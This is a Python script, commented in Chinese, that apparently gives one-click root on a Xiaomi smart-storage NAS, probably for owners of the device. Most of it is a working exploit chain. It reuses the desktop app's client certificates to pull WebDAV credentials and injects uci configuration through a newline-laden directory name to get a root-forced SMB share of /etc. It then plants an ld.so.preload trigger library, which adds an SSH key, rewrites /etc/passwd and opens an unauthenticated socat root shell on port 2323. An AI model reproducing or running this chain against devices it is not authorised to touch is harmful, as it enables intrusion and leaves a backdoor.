#!/usr/bin/env python3
"""
xiaomi-nas-root.py — 小米智能存储 (RP05, 固件 1.0.9.x) 一键获取 root
参照 kid0114/xiaomi-nas-ssh-root-tool 的使用形态，攻击链为本仓库研究的新链路（uci heredoc 注入）。

用法:
    python xiaomi-nas-root.py <NAS_IP>
    python xiaomi-nas-root.py <NAS_IP> --uid <米家数字UID>
    python xiaomi-nas-root.py <NAS_IP> --cert-dir "C:\\Users\\you\\AppData\\Local\\minasCert"

前置条件:
    1. 本机已安装"小米智能存储"桌面端并登录过 NAS（证书目录默认自动查找）
    2. 依赖: python3 (标准库), keystone-engine (pip install keystone-engine)

敏感信息说明:
    - 证书目录默认搜索常见路径; 找不到时用 --cert-dir 指定
    - WebDAV 密码自动经 mTLS 调 get_pool_info 获取, 不落盘
    - SSH 密钥: 若 ~/.ssh/id_ed25519_minas 不存在则现场生成, 私钥只写本机

攻击链 (三步):
    ① mTLS 证书 → get_pool_info 拿 WebDAV 凭据
    ② WebDAV MKCOL 换行目录名 + netshare/add_samba_account uci heredoc 注入
       → force user=root 的 SMB /etc 共享 (root 任意文件写)
    ③ /etc/ld.so.preload + aarch64 触发 .so (keystone 现场汇编)
       → cron 每分钟 root 任务执行 → 装 socat root shell(2323) + dropbear(22)
注: 本脚本不做持久化 (重启后 socat shell 与 dropbear 服务消失; SSH 公钥有意保留, 详见 USAGE.md)
"""
import argparse
import base64
import hashlib
import json
import os
import re
import secrets
import shlex
import socket
import ssl
import subprocess
import sys
import time
import urllib.parse

SHELL_PORT = 2323

CERT_SEARCH = [
    os.path.expandvars(r"%LOCALAPPDATA%\minasCert") if os.name == "nt" else None,
    os.path.expanduser("~/AppData/Local/minasCert"),
    "/Applications/小米智能存储.app/Contents/Resources/extraResources/cert",
]

STEP = [0]


def log(kind, msg):
    colors = {"ok": "\033[32m", "warn": "\033[33m", "fail": "\033[31m", "info": ""}
    reset = "\033[0m"
    if kind == "step":
        STEP[0] += 1
        print("\n\033[1m[%02d] %s\033[0m" % (STEP[0], msg))
        return
    c = colors.get(kind, "")
    print("     %s%s: %s%s" % (c, kind.upper(), msg, reset))


def die(msg):
    log("fail", msg)
    sys.exit(1)


def find_cert_dir(explicit):
    if explicit:
        return explicit if os.path.isdir(explicit) else None
    for d in CERT_SEARCH:
        if d and os.path.isdir(d):
            pems = [f for f in os.listdir(d) if f.endswith("_cert.pem")]
            if pems:
                return d
    # broad search on windows
    for base in [os.path.expandvars(r"%LOCALAPPDATA%"), os.path.expandvars(r"%APPDATA%")]:
        if not base or "%" in base or not os.path.isdir(base):
            continue
        cand = os.path.join(base, "minasCert")
        if os.path.isdir(cand):
            return cand
    return None


class Nas:
    def __init__(self, ip, cert_dir):
        self.ip = ip
        self.cert_dir = cert_dir
        pems = [f for f in os.listdir(cert_dir) if f.endswith("_cert.pem")]
        if not pems:
            die("no *_cert.pem in %s" % cert_dir)
        self.base = pems[0][:-len("_cert.pem")]
        self.ca = os.path.join(cert_dir, "ca_chain.pem")
        self.cert = os.path.join(cert_dir, pems[0])
        self.key = os.path.join(cert_dir, self.base + "_private_key.pem")
        # 服务器 SNI：nas.<uid>.<did>.<角色>。角色段不在客户端证书里且证书 SAN 只精确匹配
        # 特定值（真机实测 .0 有效，.00/.2/.20/.1 均被拒），所以逐候选验证后取可用值。
        der = base64.b64decode(b"".join(
            open(self.cert, "rb").read().splitlines()[1:-1]))
        match = re.search(rb"nas\.[0-9]+\.[0-9a-f]+", der)
        if not match:
            die("cannot parse cert CN prefix")
        prefix = match.group(0).decode()
        self.sn = None
        for role in ("0", "00", "1", "2", "20"):
            candidate = f"{prefix}.{role}"
            raw = None
            try:
                probe = ssl.create_default_context(cafile=self.ca)
                probe.load_cert_chain(str(self.cert), str(self.key))
                raw = socket.create_connection((ip, 443), timeout=8)
                with probe.wrap_socket(raw, server_hostname=candidate) as ps:
                    ps.sendall(b"")  # 握手成功即可
                self.sn = candidate
                break
            except Exception:
                if raw is not None:
                    try:
                        raw.close()
                    except OSError:
                        pass
                continue
        if not self.sn:
            die("no working server CN (tried .0/.00/.1/.2/.20 suffixes)")
        self.uid = self.sn.split(".")[1]
        self.ctx = ssl.create_default_context(cafile=self.ca)
        self.ctx.load_cert_chain(self.cert, self.key)

    def https(self, path, body=None, timeout=15):
        raw = socket.create_connection((self.ip, 443), timeout=timeout)
        s = self.ctx.wrap_socket(raw, server_hostname=self.sn)
        if body is not None:
            if isinstance(body, (dict, list)):
                body = json.dumps(body).encode()
            elif isinstance(body, str):
                body = body.encode()
            req = ("POST %s HTTP/1.1\r\nHost: n\r\nConnection: close\r\n"
                   "Content-Type: application/json\r\nContent-Length: %d\r\n\r\n" % (path, len(body))).encode() + body
        else:
            req = ("GET %s HTTP/1.1\r\nHost: n\r\nConnection: close\r\n\r\n" % path).encode()
        s.sendall(req)
        chunks = []
        s.settimeout(timeout)
        # Connection: close 语义下服务器发完才关连接；超时多为网络慢，
        # 重试至收满（对 timeout 异常重试，对连接关闭/重置停止）
        idle = 0
        while True:
            try:
                d = s.recv(65536)
            except socket.timeout:
                idle += 1
                if idle >= 3:
                    break
                continue
            except OSError:
                break
            if not d:
                break
            idle = 0
            chunks.append(d)
        s.close()
        return b"".join(chunks)  # bytes：chunked 长度是字节数，解码必须在解块之后

    def json_body(self, resp):
        """按字节解码 chunked（长度行是字节数，先 decode 会错位），再解析 JSON。
        解析失败返回 {"raw": ..., "http_status": ...}（A4：调用方区分网络失败与业务失败）。"""
        if isinstance(resp, str):
            resp = resp.encode("utf-8", "surrogateescape")
        i = resp.find(b"\r\n\r\n")
        head, b = resp[:i], resp[i + 4:]
        status = head.split(b"\r\n")[0].decode("utf-8", "replace") if i >= 0 else ""
        if i >= 0 and b"chunked" in head.lower():
            out = b""
            while b:
                m = re.match(rb"([0-9a-fA-F]+)\r\n", b)
                if not m:
                    break
                size = int(m.group(1), 16)
                if size == 0:
                    break
                b = b[m.end():]
                out += b[:size]
                b = b[size + 2:]
            b = out
        text = b.decode("utf-8", "replace")
        try:
            parsed = json.loads(text.strip())
            if isinstance(parsed, dict):
                parsed["http_status"] = status.strip()
            return parsed
        except Exception:
            return {"raw": text[:200], "http_status": status.strip()}

    def webdav(self, method, path, body=None, auth=None, timeout=20):
        raw = socket.create_connection((self.ip, 5000), timeout=timeout)
        s = self.ctx.wrap_socket(raw, server_hostname=self.sn)
        hdrs = {"Host": "n", "Connection": "close"}
        if auth:
            hdrs["Authorization"] = auth
        if body is not None:
            if isinstance(body, str):
                body = body.encode()
            hdrs["Content-Length"] = str(len(body))
        req = "%s %s HTTP/1.1\r\n" % (method, path)
        req += "".join("%s: %s\r\n" % (k, v) for k, v in hdrs.items()) + "\r\n"
        s.sendall(req.encode())
        if body is not None:
            s.sendall(body)
        chunks = []
        s.settimeout(timeout)
        idle = 0
        while True:
            try:
                d = s.recv(65536)
            except socket.timeout:
                idle += 1
                if idle >= 3:
                    break
                continue
            except OSError:
                break
            if not d:
                break
            chunks.append(d)
        s.close()
        return b"".join(chunks).decode("utf-8", "replace")


def build_trigger_so(path_out):
    """assemble minimal aarch64 ET_DYN .so whose DT_INIT forks /bin/sh /etc/.rootpwn.sh"""
    try:
        from keystone import Ks, KS_ARCH_ARM64, KS_MODE_LITTLE_ENDIAN
    except ImportError:
        die("keystone-engine missing: pip install keystone-engine")
    import struct

    ks = Ks(KS_ARCH_ARM64, KS_MODE_LITTLE_ENDIAN)
    asm = (
        "init_fn:\n"
        "    mov x0, #17\n"
        "    mov x1, xzr\n"
        "    mov x2, xzr\n"
        "    mov x3, xzr\n"
        "    mov x4, xzr\n"
        "    mov x8, #220\n"
        "    svc #0\n"
        "    cbnz x0, done\n"
        "    adr x0, str_sh\n"
        "    adr x5, str_script\n"
        "    stp x0, x5, [sp, #-32]!\n"
        "    str xzr, [sp, #16]\n"
        "    mov x1, sp\n"
        "    mov x2, xzr\n"
        "    mov x8, #221\n"
        "    svc #0\n"
        "    mov x8, #93\n"
        "    mov x0, #127\n"
        "    svc #0\n"
        "done:\n"
        "    ret\n"
        "str_sh:\n"
        '    .ascii "/bin/sh\\0"\n'
        "str_script:\n"
        '    .ascii "/etc/.rootpwn.sh\\0"\n'
    )
    enc, cnt = ks.asm(asm)
    code = bytes(enc)

    NUM_PH = 2
    code_va = 0x1000
    data = bytearray(b"\x00" * 0x1000)
    data[code_va:code_va + len(code)] = code
    strtab_off = code_va + len(code)
    data += b"\x00"
    symtab_off = strtab_off + 1
    data += b"\x00" * 24
    dyn_off = symtab_off + 24

    dyn = b""
    dyn += struct.pack("<qQ", 12, code_va)      # DT_INIT
    dyn += struct.pack("<qQ", 5, strtab_off)    # DT_STRTAB
    dyn += struct.pack("<qQ", 6, symtab_off)    # DT_SYMTAB
    dyn += struct.pack("<qQ", 10, 1)            # DT_STRSZ
    dyn += struct.pack("<qQ", 11, 24)           # DT_SYMENT
    dyn += struct.pack("<qQ", 0, 0)             # DT_NULL
    data += dyn
    file_size = len(data)

    data[0:4] = b"\x7fELF"
    data[4] = 2
    data[5] = 1
    data[6] = 1
    struct.pack_into("<HHIQQQIHHHHHH", data, 16, 3, 0xB7, 1, 0, 64, 0, 0, 64, 56, NUM_PH, 0, 0, 0)

    def phdr(off, p_type, flags, off_in_file, filesz):
        data[off:off + 56] = struct.pack("<IIQQQQQQ", p_type, flags, off_in_file, off_in_file,
                                         off_in_file, filesz, filesz, 0x1000)

    phdr(64, 1, 5, 0, file_size)
    phdr(120, 2, 4, dyn_off, len(dyn))
    open(path_out, "wb").write(bytes(data))
    return file_size


def ssh_key_path():
    p = os.path.expanduser("~/.ssh/id_ed25519_minas")
    os.makedirs(os.path.dirname(p), exist_ok=True)
    if not os.path.exists(p):
        r = subprocess.run(["ssh-keygen", "-t", "ed25519", "-f", p, "-N", "", "-C", "minas-root"],
                           capture_output=True)
        if r.returncode != 0:
            die("ssh-keygen failed: %s" % r.stderr.decode(errors="replace"))
        log("ok", "generated new key %s" % p)
    return p


def tcp_open(ip, port, timeout=3):
    try:
        s = socket.create_connection((ip, port), timeout=timeout)
        s.close()
        return True
    except Exception:
        return False


def _smb_write_file(share, name, data, password):
    """经 root SMB 共享写文件（WebDAV 拒绝 /etc，实测 451）。Windows 用 net use 挂载；
    POSIX 挂 cifs 失败则报错让用户手动处理。幂等：重复挂载无妨。"""
    path = share + "\\" + name
    if os.name == "nt":
        # 先尝试直接写（Windows 对 UNC 路径可用已存凭据）
        try:
            with open(path, "wb") as f:
                f.write(data)
            return
        except OSError:
            pass
        # 未认证：挂载共享（用户 u<uid>，密码为步骤②创建共享时设置的）
        uid = share.rsplit("-", 1)[-1]
        subprocess.run(["net", "use", share, "/user:u" + uid, password],
                       capture_output=True, timeout=30)
        try:
            with open(path, "wb") as f:
                f.write(data)
        finally:
            subprocess.run(["net", "use", share, "/delete"], capture_output=True, timeout=30)
        return
    # POSIX: 尝试 cifs 挂载（多数发行版需 cifs-utils）
    import tempfile
    mnt = tempfile.mkdtemp()
    uid = share.rsplit("-", 1)[-1]
    res = subprocess.run(["mount", "-t", "cifs", share, mnt,
                          "-o", "username=u{},".format(uid) + "password=" + password],
                         capture_output=True, timeout=30)
    if res.returncode != 0:
        raise OSError("cifs mount failed: %s (请手动挂载 %s 后重试)" %
                      (res.stderr.decode(errors="replace")[:200], share))
    try:
        with open(os.path.join(mnt, name), "wb") as f:
            f.write(data)
    finally:
        subprocess.run(["umount", mnt], capture_output=True, timeout=30)
        os.rmdir(mnt)


class SmbSetupError(RuntimeError):
    """SMB state could not be verified; never guess an account ID or retry a write."""


def _smb_id(value):
    if type(value) not in (int, str) or str(value) not in ("1", "2"):
        raise SmbSetupError("SMB 返回了无效的账号 ID，停止以保护原有配置")
    return str(value)


def _smb_call(nas, operation, body, timeout=15, allowed=(0,)):
    try:
        response = nas.json_body(nas.https("/cgi-bin/luci/netshare/" + operation,
                                           body, timeout=timeout))
    except OSError as exc:
        raise SmbSetupError("%s 网络异常（%s）；停止，不自动重试写入" %
                            (operation, type(exc).__name__)) from exc
    # 不打印响应原文：账号列表及错误响应可能带密码。
    if (not isinstance(response, dict) or
            not re.match(r"^HTTP/\d(?:\.\d)? 2\d\d(?: |$)", response.get("http_status", "")) or
            type(response.get("code")) is not int):
        raise SmbSetupError("%s 响应不完整或 HTTP 失败；停止，不将缺失 code 视为成功" % operation)
    if response["code"] == 2509:
        raise SmbSetupError("%s: 该账号已存在（2509）；保留原账号和共享配置，不尝试覆盖" % operation)
    if response["code"] not in allowed:
        raise SmbSetupError("%s failed (code=%d)；停止，不尝试修改其他账号" %
                            (operation, response["code"]))
    return response


def _smb_accounts(nas):
    response = _smb_call(nas, "get_samba_account", {})
    data = response.get("data")
    entries = data.get("account") if isinstance(data, dict) else None
    if not isinstance(entries, list):
        raise SmbSetupError("SMB 账号列表缺失或格式错误，停止以保护原有配置")
    accounts = {}
    for entry in entries:
        if not isinstance(entry, dict):
            raise SmbSetupError("SMB 账号记录格式错误")
        id = _smb_id(entry.get("id"))
        dirs = entry.get("share_dir")
        if (id in accounts or not isinstance(entry.get("username"), str) or
                not isinstance(entry.get("password"), str) or
                not isinstance(dirs, list) or len(dirs) != 1 or not isinstance(dirs[0], str) or
                str(entry.get("status")) not in ("0", "1")):
            raise SmbSetupError("SMB 账号记录不完整或 ID 重复，停止以保护原有配置")
        accounts[id] = dict(entry, id=id, status=str(entry["status"]))
    return accounts


def _verify_smb_created(nas, original, id, username, password, path):
    accounts = _smb_accounts(nas)
    if (set(accounts) != set(original) | {id} or
            any(accounts.get(key) != entry for key, entry in original.items())):
        raise SmbSetupError("SMB 原有配置发生变化；停止，不覆盖或清理任何已有记录")
    created = accounts.get(id)
    if (id in original or created is None or created["username"] != username or
            created["password"] != password or created["share_dir"] != [path] or
            created["status"] != "1"):
        raise SmbSetupError("无法确认本次新建的 SMB 账号及共享；停止，不猜测 ID 或继续设置")
    return created


def _setup_smb_share(nas, auth):
    """只在空闲槽位新建本次临时账号；已有账号、密码、路径和启停状态均不复用。"""
    if not re.fullmatch(r"[0-9]+", nas.uid) or nas.uid != nas.sn.split(".")[1]:
        raise SmbSetupError("SMB UID 必须与认证证书一致，停止以保护其他用户配置")
    username = "u" + nas.uid
    original = _smb_accounts(nas)
    if any(entry["username"].upper() == username.upper() for entry in original.values()):
        raise SmbSetupError("SMB 账号 %s 已存在；保留原密码和共享配置，停止，不复用已有账号" % username)
    # 固件 smb_get_id 只检查 _1：不存在选 1，否则选 2；它不会检查 _2 是否已占用。
    planned_id = "1" if "1" not in original else "2"
    if planned_id in original:
        raise SmbSetupError("SMB 账号槽位已满；保留原账号和共享配置，不覆盖 ID=%s" % planned_id)
    # get 只返回当前用户的账号；judge 另行检查其他 NAS 用户占用的同名账号。
    _smb_call(nas, "judge_samba_account", {"username": username})

    section = "%s_%s" % (username, planned_id)
    weird_name = (
        "M" + secrets.token_hex(15)[:29] + '\n"\n' +
        "set sambashare.%s.user_force=root\n" % section +
        "set sambashare.%s.create_mask=0644\n" % section +
        "set sambashare.%s.path=etc\n" % section +
        "set sambashare.%s.comment=" % section
    )
    # 独立随机目录，拒绝复用 405，避免清理上次运行或用户原有的目录。
    enc = urllib.parse.quote(weird_name, safe="")
    response = nas.webdav("MKCOL", "/pool0/data/" + enc + "/", auth=auth)
    if not response.split("\r\n", 1)[0].startswith("HTTP/1.1 201 "):
        raise SmbSetupError("SMB staging MKCOL 未返回 201，停止，不复用已有目录")
    weird_real = "/home/%s/pool0/data/%s" % (username, weird_name)
    password = "Rp!" + secrets.token_urlsafe(12)
    if _smb_accounts(nas) != original:
        raise SmbSetupError("SMB 配置在预检后发生变化；停止，未新增或设置账号")
    result = _smb_call(nas, "add_samba_account", {
        "username": username, "password": password, "share_dir": [weird_real],
    }, timeout=60, allowed=(0, 2502))
    created = _verify_smb_created(nas, original, planned_id, username, password, weird_real)
    actual_id = created["id"]
    data = result.get("data")
    if data is not None:
        if not isinstance(data, dict) or _smb_id(data.get("id")) != actual_id:
            raise SmbSetupError("SMB 新增返回的 ID 与读回记录不符；停止，不设置或删除任何账号")
    if result["code"] == 2502:
        log("warn", "add_samba_account code=2502；已读回确认本次新建 ID=%s，再修复共享路径" % actual_id)
    else:
        log("ok", "SMB 临时账号已新建并核对 ID=%s" % actual_id)
    _smb_call(nas, "set_samba_account", {
        "id": actual_id, "username": username, "password": password, "share_dir": ["/etc"],
    }, timeout=120)
    _verify_smb_created(nas, original, actual_id, username, password, "/etc")
    return actual_id, weird_name, password


def _disarm_command(uid, weird_name, smb_id, smb_password):
    """清理命令（成功与失败路径共用）。覆盖：preload/payload 文件、staging 怪名目录、
    注入的 samba 共享与系统用户。注意 authorized_keys 有意保留（SSH 认证通道）。"""
    if not re.fullmatch(r"[0-9]+", uid):
        raise ValueError("invalid cleanup UID")
    smb_id = _smb_id(smb_id)
    section = "u%s_%s" % (uid, smb_id)
    # ID 仍相同不等于仍属本次运行。核对口令指纹和当前配置，变化时不删记录。
    expected = {
        "sambauser.%s.id" % section: smb_id,
        "sambauser.%s.user" % section: "u" + uid,
        "sambauser.%s.name" % section: "u" + uid,
        "sambauser.%s.dirs" % section: "/etc",
        "sambauser.%s.status" % section: "1",
        "sambashare.%s.name" % section: "etc-" + uid,
        "sambashare.%s.path" % section: "/etc",
        "sambashare.%s.users" % section: "sambau" + uid,
        "sambashare.%s.user_force" % section: "root",
    }
    checks = ['[ "$(uci -q get %s)" = %s ]' % (key, shlex.quote(value))
              for key, value in expected.items()]
    fingerprint = hashlib.sha256(smb_password.encode()).hexdigest()
    checks.append('[ "$(printf \'%s\' "$(uci -q get sambauser.%s.passwd)" | '
                  'sha256sum | cut -d \' \' -f 1)" = %s ]' % ("%s", section, fingerprint))
    staging = shlex.quote("/home/u%s/pool0/data/%s" % (uid, weird_name))
    return ("rm -f /etc/ld.so.preload /etc/pwn.so /etc/.rootpwn.sh /etc/.rootpwn.log; "
            "if %s; then "
            "if rm -rf %s && "
            "uci delete sambashare.%s && uci commit sambashare && "
            "uci delete sambauser.%s && uci commit sambauser && "
            "sed -i '/^sambau%s:/d' /etc/passwd /etc/shadow && "
            "(nas call smb_mgr.sh restart 2>/dev/null || systemctl restart smb nmb 2>/dev/null); "
            "then echo CLEAN_OK; else echo SMB_CLEAN_FAILED; fi; "
            "else echo SMB_CLEAN_SKIP; fi"
            ) % (" && ".join(checks), staging, section, section, uid)


def _cleanup_via_shell(args, disarm):
    """经 socat root shell 真正执行清理（成功与失败路径均调用）。
    自身绝不抛异常（FileNotFoundError/TimeoutExpired 等一律捕获降级），失败降级链：
    ① 写完整命令到本地 cleanup-<ip>.sh 并打印路径（用户可经 SMB 上传执行）
    ② 打印完整手动命令（不截断）。"""
    try:
        if tcp_open(args.ip, args.shell_port, timeout=3):
            import subprocess as sp
            b64 = base64.b64encode(disarm.encode()).decode()
            feed = "echo %s | base64 -d | bash" % b64
            try:
                if os.name == "nt":
                    res = sp.run(["wsl", "bash", "-c",
                                  f"printf '{feed}\\nexit\\n' | timeout 30 nc {args.ip} {args.shell_port}"],
                                 capture_output=True, text=True, timeout=60, encoding="utf-8",
                                 errors="replace")
                else:
                    res = sp.run(["bash", "-c",
                                  f"printf '{feed}\\nexit\\n' | timeout 30 nc {args.ip} {args.shell_port}"],
                                 capture_output=True, text=True, timeout=60, encoding="utf-8",
                                 errors="replace")
                if "CLEAN_OK" in (res.stdout or ""):
                    log("ok", "清理完成（preload/共享/staging 已清除）")
                    return
                if "SMB_CLEAN_SKIP" in (res.stdout or ""):
                    log("warn", "SMB 配置已变化或不再属于本次运行；保留账号和共享，跳过删除")
            except (OSError, sp.TimeoutExpired) as exc:
                log("warn", "清理执行异常（%s），降级到手动方式" % type(exc).__name__)
        _dump_manual_cleanup(args, disarm)
    except Exception as exc:  # 清理自身绝不能成为崩溃点
        log("warn", "清理流程异常（%s），请手动执行" % type(exc).__name__)
        _dump_manual_cleanup(args, disarm)


def _dump_manual_cleanup(args, disarm):
    """完整清理命令落地：写本地 cleanup-<ip>.sh（用户可经 SMB root 共享上传后 bash 执行），
    并全量打印（不截断）。"""
    try:
        script = "#!/bin/sh\n# xiaomi-nas-root-tool cleanup for %s\n%s\n" % (args.ip, disarm)
        local = "cleanup-%s.sh" % args.ip
        with open(local, "w", newline="\n") as f:
            f.write(script)
        log("warn", "自动清理不可用；完整清理命令已写入 %s（可经 SMB root 共享上传到 /etc 后执行）" % local)
    except OSError:
        pass
    print()
    log("warn", "手动清理命令（完整，任一 root 通道执行）：")
    print("    " + disarm)


def main():
    ap = argparse.ArgumentParser(description="Xiaomi NAS one-click root (RP05, fw 1.0.9.x)")
    ap.add_argument("ip")
    ap.add_argument("--uid", default=None, help="mi UID digits (default: parsed from cert)")
    ap.add_argument("--cert-dir", default=None, help="client cert dir (auto-searched by default)")
    ap.add_argument("--shell-port", type=int, default=SHELL_PORT)
    args = ap.parse_args()

    log("step", "定位客户端证书")
    cert_dir = find_cert_dir(args.cert_dir)
    if not cert_dir:
        die("cert dir not found; pass --cert-dir (App 安装目录下 minasCert)")
    log("ok", cert_dir)

    nas = Nas(args.ip, cert_dir)
    if args.uid:
        nas.uid = args.uid
    log("ok", "uid=%s sn=%s" % (nas.uid, nas.sn))

    # ---------- ① get WebDAV creds ----------
    log("step", "mTLS 获取 WebDAV 凭据 (get_pool_info)")
    j = nas.json_body(nas.https("/cgi-bin/luci/filemgr/get_pool_info", {"selector": ["webDAV"]}))
    wd = (j.get("data") or {}).get("webDAV") or {}
    if not wd.get("username"):
        die("get_pool_info failed: %s" % j)
    auth = "Basic " + base64.b64encode(("%s:%s" % (wd["username"], wd["password"])).encode()).decode()
    log("ok", "webdav user=%s port=%s (密码不显示)" % (wd["username"], wd.get("port")))

    # ---------- ② uci heredoc injection → root share ----------
    log("step", "uci 注入: 建立 force user=root 的 /etc SMB 共享")
    try:
        smb_id, weird_name, smb_password = _setup_smb_share(nas, auth)
    except SmbSetupError as exc:
        die(str(exc))
    log("ok", "SMB /etc share configured as user u%s (ID=%s)" % (nas.uid, smb_id))

    # ---------- ③ preload trigger ----------
    log("step", "写入 /etc/ld.so.preload + 触发 .so (cron 每分钟生效)")
    keyp = ssh_key_path()
    pubkey = open(keyp + ".pub").read().strip()

    so_local = os.path.join(os.path.dirname(os.path.abspath(__file__)), "pwn_trigger.so")
    build_trigger_so(so_local)
    log("ok", "trigger .so assembled (%d bytes)" % os.path.getsize(so_local))

    payload = "\n".join([
        "#!/bin/sh",
        "rm -f /etc/ld.so.preload",
        "echo \"PWN $(date) uid=$(id -u)\" >> /etc/.rootpwn.log",
        "mkdir -p /home/rootx/.ssh /etc/dropbear",
        "grep -q minas-root /home/rootx/.ssh/authorized_keys 2>/dev/null || echo '" + pubkey + "' >> /home/rootx/.ssh/authorized_keys",
        "grep -q minas-root /etc/dropbear/authorized_keys 2>/dev/null || echo '" + pubkey + "' >> /etc/dropbear/authorized_keys",
        "chmod 700 /home/rootx/.ssh /etc/dropbear",
        "chmod 600 /home/rootx/.ssh/authorized_keys /etc/dropbear/authorized_keys",
        "sed -i 's#^root:x:0:0:root:/root:#root:x:0:0:root:/home/rootx:#' /etc/passwd 2>/dev/null",
        "systemctl start dropbear.socket 2>/dev/null",
        "pgrep -f TCP-LISTEN:%d >/dev/null || nohup socat TCP-LISTEN:%d,reuseaddr,fork EXEC:\"/bin/bash -li\",pty,stderr,setsid,sigint,sane >/dev/null 2>&1 &" % (args.shell_port, args.shell_port),
        "logger -t rootpwn root-shell-enabled",
    ])

    # /etc 写入走 SMB root 共享（WebDAV 路由层拒绝 /etc，实测 451）。
    # 固件 set_samba_account 会按新路径 /etc 把共享名改成 etc-<uid>。
    share = "\\\\%s\\etc-%s" % (args.ip, nas.uid)
    disarm = _disarm_command(nas.uid, weird_name, smb_id, smb_password)
    try:
        _smb_write_file(share, ".rootpwn.sh", payload.encode(), smb_password)
        _smb_write_file(share, "pwn.so", open(so_local, "rb").read(), smb_password)
        log("ok", "payload + .so written to /etc (SMB root share)")
    except OSError as exc:
        # 中途失败：共享已建，必须清理后再 die
        _cleanup_via_shell(args, disarm)
        die("SMB write to %s failed: %s (net use %s /user:u%s %s 手动挂载排查)"
            % (share, exc, share, nas.uid, smb_password))
    try:
        _smb_write_file(share, "ld.so.preload", b"/etc/pwn.so\n", smb_password)
    except OSError as exc:
        _cleanup_via_shell(args, disarm)
        die("arm ld.so.preload failed: %s" % exc)
    log("ok", "ld.so.preload armed — waiting for cron (≤75s)")

    # 触发判据只认 socat 端口：22 端口可能因设备原有 dropbear.socket 已激活而误报
    t0 = time.time()
    got = False
    while time.time() - t0 < 90:
        if tcp_open(args.ip, args.shell_port):
            got = True
            break
        time.sleep(3)

    if not got:
        # 触发失败也必须清理（preload 永久布防会让全机动态进程反复加载）
        _cleanup_via_shell(args, disarm)
        die("trigger did not fire in 90s (socat port %d not open); cleanup attempted. "
            "若 22 端口已开或 /etc/.rootpwn.log 有新记录，说明触发实际成功、仅设备缺少 socat——"
            "此时公钥已注入，可走 SSH 认证通道" % args.shell_port)

    log("step", "验证 root 通道")
    ok22 = tcp_open(args.ip, 22)
    ok23 = tcp_open(args.ip, args.shell_port)
    log("ok" if ok22 else "warn", "SSH 22: %s (dropbear exec bug 可致命令无输出, 认证可用)" % ("OPEN" if ok22 else "closed"))
    log("ok" if ok23 else "warn", "root shell %d: %s" % (args.shell_port, "OPEN" if ok23 else "closed"))

    # 成功后真正执行清理（经已就绪的 root shell）
    _cleanup_via_shell(args, disarm)

    print()
    print("\033[1m✅ root 获取完成\033[0m")
    print("   root shell:  nc %s %d   (或 wsl: wsl bash -c 'nc %s %d')" % (args.ip, args.shell_port, args.ip, args.shell_port))
    print("   SSH:        ssh -i %s root@%s   (公钥已注入; dropbear exec bug 下认证可用)" % (keyp, args.ip))
    print("   会话性质:   未做重启持久化——socat shell 与 dropbear.socket 重启后消失;")
    print("               清理已尝试（结果以清理日志为准）。注意:/etc/dropbear/")
    print("               authorized_keys 与 /home/rootx/.ssh/authorized_keys 中的公钥保留(SSH")
    print("               认证通道重启后仍可用), 如需彻底移除: 删除这两个文件并把 passwd 中")
    print("               root 的 home 改回 /root")


if __name__ == "__main__":
    main()
